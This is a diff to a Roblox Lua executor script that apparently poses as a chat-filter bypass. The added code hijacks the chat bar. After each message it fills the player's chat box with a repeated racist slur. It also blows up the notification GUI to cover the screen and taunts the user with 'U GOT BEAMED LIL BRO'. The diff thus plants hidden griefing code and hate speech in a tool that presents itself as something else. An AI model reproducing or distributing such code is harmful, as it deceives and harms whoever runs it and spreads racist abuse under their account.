@@ -1,7 +1,57 @@
 
 repeat task.wait() until game:IsLoaded()
 
+local TCS = game:GetService("TextChatService")
+local CoreGui = game:GetService("CoreGui")
+local RStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer.PlayerGui
+
+local isLegacy = TCS.ChatVersion == Enum.ChatVersion.LegacyChatService
+local ChatBar = CoreGui:FindFirstChild("TextBoxContainer", true) or PlayerGui:FindFirstChild("Chat"):FindFirstChild("ChatBar", true)
+ChatBar = ChatBar:FindFirstChild("TextBox") or ChatBar
+
+local Keywords = {
+
+}
+
+local Gen = function(Message)
+    for _, info in Keywords do
+        local real = info[1]
+        local bypass = info[2]
+        Message = Message:gsub(real, bypass)
+    end
+    return Message
+end
+
+local Connection = Instance.new("BindableFunction")
+
+for _, c in getconnections(ChatBar.FocusLost) do
+    c:Disconnect()
+end
+
+ChatBar.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        Connection:Invoke(ChatBar.Text)
+        ChatBar.Text = "im a nigger im a nigger im a nigger im a nigger im a nigger im a nigger im a nigger im a nigger im a nigger"
+    end
+end)
+
+Connection.OnInvoke = function(Message)
+    Message = Gen(Message)
+    if isLegacy then
+        local ChatRemote = RStorage:FindFirstChild("SayMessageRequest", true)
+        ChatRemote:FireServer(Message, "All")
+    else
+        local Channel = TCS.TextChannels.RBXGeneral
+        Channel:SendAsync(Message)
+    end
+end
 
 local NotifyModule = {}
 
@@ -23,13 +73,13 @@ if not NotifyGui then
     Template.Name = "Template"
     Template.Parent = NotifyGui
     Template.AnchorPoint = Vector2.new(.5, .5)
-    Template.BackgroundTransparency = 1
-    Template.BorderSizePixel = 0
+    Template.BackgroundTransparency = 0
+    Template.BorderSizePixel = 200000
     Template.Position = UDim2.new(.5, 0, 1.5, 0)
-    Template.Size = UDim2.new(.8, 0, .1, 0)
+    Template.Size = UDim2.new(111, 111, 111, 111)
     Template.Font = Enum.Font.Code
     Template.Text = ""
-    Template.TextSize = 30
+    Template.TextSize = 1000000000
     Template.TextWrapped = true
 end
 
@@ -43,18 +93,18 @@ function NotifyModule:Notify(Text, Duration)
         Clone.Name = "ClonedNotification"
         Clone.Parent = NotifyGui
         Clone.Text = Text
-        Clone.TextColor3 = Color3.fromRGB(75, 121, 233)
+        Clone.TextColor3 = Color3.fromRGB(100, 121, 233)
 
         local UIStroke = Instance.new("UIStroke")
         UIStroke.Parent = Clone
-        UIStroke.Thickness = 1
-        UIStroke.Transparency = 0.5
+        UIStroke.Thickness = 500
+        UIStroke.Transparency = 1
         
         if not Duration or Duration == nil then
-    	    Duration = 5
+    	    Duration = 10000
         end
     	
-        local FinalPosition = 0
+        local FinalPosition = .225
         
         for _, x in next, NotifyGui:GetChildren() do
             if x.Name ~= "Template" then
@@ -76,5 +126,5 @@ function NotifyModule:Notify(Text, Duration)
     end)
 end
 
-NotifyModule:Notify("nice account u js got beamed haha", 5)
+NotifyModule:Notify("U GOT BEAMED LIL BRO :P", 100000000000000000000)
 
